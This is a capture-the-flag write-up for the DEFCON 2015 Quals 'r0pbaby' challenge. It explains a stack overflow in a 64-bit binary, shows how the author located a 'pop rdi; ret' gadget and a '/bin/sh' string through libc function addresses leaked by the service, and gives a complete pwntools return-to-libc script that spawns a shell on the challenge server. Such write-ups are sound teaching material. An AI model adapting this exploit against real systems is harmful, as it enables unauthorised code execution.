---
title: 'DEFCON CTF 2015 Quals -- r0pbaby'
date: 2015-05-23 22:38
tags:
  - DEFCON
  - CTF
  - ROP
  - Pwnable
  - Python
categories:
  - write-ups
---
**Category:** Baby's First
**Points:** 1
> r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me:10436

<!-- more -->

64 bit ELF. No stack guard, but it has NX & PIE protection.  
The service will give you a menu first:  
> Welcome to an easy Return Oriented Programming challenge...
> Menu:
> 1) Get libc address
> 2) Get address of a libc function
> 3) Nom nom r0p buffer to stack
> 4) Exit

Th first one will print out the `libc.so.6`'s address, which contains the **real** libc base address. The second one will ask you to input a libc function's symbol, and print out the function's address. The third one will ask you to input a number(string length) and a string.  

After we check the binary with IDA Pro, we found the following informations:

```c
v0 = (signed __int64)nptr; // our input buffer
v1 = (signed __int64)&savedregs; // dest
memcpy(&savedregs, nptr, v7);
```

Our input will be stored at `nptr` first, then it'll be memcpy to `savedregs`. Let's check the location of `savedregs`:  
```c 
char nptr[1088]; // [sp+10h] [bp-440h]@2
__int64 savedregs; // [sp+450h] [bp+0h]@22 // on rpb
```

Right on the `rbp`!  
So everytime we choose `3)` and input something, it'll be copy to `rbp`, which means we can overwrite the return address. Since the binary has the **NX protection**, we better try the **return-2-libc** attack.  

The key point is to find a useful gadget. At first I try to leak the libc's base address, and attempt to guess the libc's version so I can calculate the `/bin/sh` and `pop rdi, ret` gadget. But I end with failure, since there's no other memory leakage vulnerability. At this moment, my teammate **bananaapple** propose a solution: **How about we find a gadget that's inside a function?**  

For instance, if we want to find a gadget `pop rdi, ret`, since `pop rdi, ret` = `5f c3` in machine code, we'll just have to find a functions that contains 2 bytes data `5f c3`, then we can calculate the offset and get the gadget's address. 

Using the aforementioned method, we quickly found that `5f c3` was at `_IO_proc_open` + 0x34d and `/bin/sh` was at `_libc_intl_domainname` + 0x0242. With these informations, we can now construct a ROP chain and exploit the service:

```python 
#!/usr/bin/env python

from pwn import *
import sys
import time

#HOST = "localhost"
HOST = "r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me"
PORT = 10436
#LIBC_PATH = "/lib/x86_64-linux-gnu/libc-2.19.so"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32

r = remote(HOST, PORT)

if __name__ == "__main__":

    print r.recvuntil(": ")

    # get system address
    r.sendline("2")
    r.recv(1024)
    r.sendline("system")
    s = r.recvuntil("Exit\n: ")
    print s
    system_addr = int(s[s.index("0x"):s.index("\n1)"):].strip(), 16)
    log.success("system_addr: "+hex(system_addr))

    # get _IO_proc_open address to calculate [pop rdi, ret]'s address
    r.sendline("2")
    r.recv(1024)
    r.sendline("_IO_proc_open")
    s = r.recvuntil("Exit\n: ")
    print s
    open_addr = int(s[s.index("0x"):s.index("\n1)"):].strip(), 16)
    pop_rdi_ret = open_addr + 0x34c + 1
    log.success("pop_rdi_ret: "+hex(pop_rdi_ret))
 
    # get _libc_intl_domainname address to calculate /bin/sh's address
    r.sendline("2")
    r.recv(1024)
    r.sendline("_libc_intl_domainname")
    s = r.recvuntil("Exit\n: ")
    print s
    domain_addr = int(s[s.index("0x"):s.index("\n1)"):].strip(), 16)
    bin_sh = domain_addr + 0x242
    log.success("bin_sh: "+hex(bin_sh))

    payload = "AAAAAAAA" # rbp
    payload += p64(pop_rdi_ret) # pop rdi, ret
    payload += p64(bin_sh) # char* point to /bin/sh
    payload += p64(system_addr) # system

    # send the payload
    r.sendline("3")
    r.recv(1024)
    r.sendline(str(len(payload)))
    r.sendline(payload)
    
    r.interactive()

```

Flag: `W3lcome TO THE BIG L3agu3s kiddo, wasn't your first?`
